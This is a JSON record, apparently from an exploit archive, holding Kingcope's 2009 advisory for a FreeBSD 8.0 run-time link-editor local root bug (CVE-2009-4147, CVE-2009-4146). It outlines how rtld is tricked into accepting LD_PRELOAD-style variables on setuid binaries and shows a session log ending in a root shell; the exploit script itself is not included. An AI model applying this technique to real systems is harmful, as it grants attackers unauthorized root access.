{
    "text": "ecve : CVE-2009-4147 CVE-2009-4146 ， title : FreeBSD 8.0 Run-Time Link-Editor ( RTLD ) - Local Privilege Escalation - BSD local Exploit ， verified : Verified ， exploit_detail : Discovered & Exploited by Nikolaos Rangos also known as Kingcope. ， Nov 2009 \"BiG TiME\" ， \"Go fetch your FreeBSD r00tkitz\" // ， There is an unbelievable simple local r00t bug in recent FreeBSD versions. ， I audited FreeBSD for local r00t bugs a long time * sigh * . Now it pays out. ， The bug resides in the Run-Time Link-Editor ( rtld ) . ， Normally rtld does not allow dangerous environment variables like LD_PRELOAD ， to be set when executing setugid binaries like \"ping\" or \"su\". ， With a rather simple technique rtld can be tricked into ， accepting LD variables even on setugid binaries. ， See the attached exploit for details. ， Example exploiting session ， %uname -a ; id ;  ， FreeBSD r00tbox.Belkin 8.0-RELEASE FreeBSD 8.0-RELEASE # 0 : Sat Nov 21 ， 15 : 48 : 17 UTC 2009 ， root @ almeida.cse.buffalo.edu : /usr/obj/usr/src/sys/GENERIC i386 ， uid=1001 ( kcope ) gid=1001 ( users ) groups=1001 ( users )  ， %./w00t.sh ， FreeBSD local r00t zeroday ， by Kingcope ， November 2009 ， env.c : In function 'main' :  ， env.c : 5 : warning : incompatible implicit declaration of built-in ， function 'malloc' ， env.c : 9 : warning : incompatible implicit declaration of built-in ， function 'strcpy' ， env.c : 11 : warning : incompatible implicit declaration of built-in ， function 'execl' ， /libexec/ld-elf.so.1 : environment corrupt ; missing value for ， /libexec/ld-elf.so.1 : environment corrupt ; missing value for ， /libexec/ld-elf.so.1 : environment corrupt ; missing value for ， /libexec/ld-elf.so.1 : environment corrupt ; missing value for ， /libexec/ld-elf.so.1 : environment corrupt ; missing value for ， /libexec/ld-elf.so.1 : environment corrupt ; missing value for ， ALEX-ALEX ，  # uname -a ; id ;  ， FreeBSD r00tbox.Belkin 8.0-RELEASE FreeBSD 8.0-RELEASE # 0 : Sat Nov 21 ， 15 : 48 : 17 UTC 2009 ， root @ almeida.cse.buffalo.edu : /usr/obj/usr/src/sys/GENERIC i386 ， uid=1001 ( kcope ) gid=1001 ( users ) euid=0 ( root ) groups=1001 ( users ) ",
    "time": "2009-11-30"
}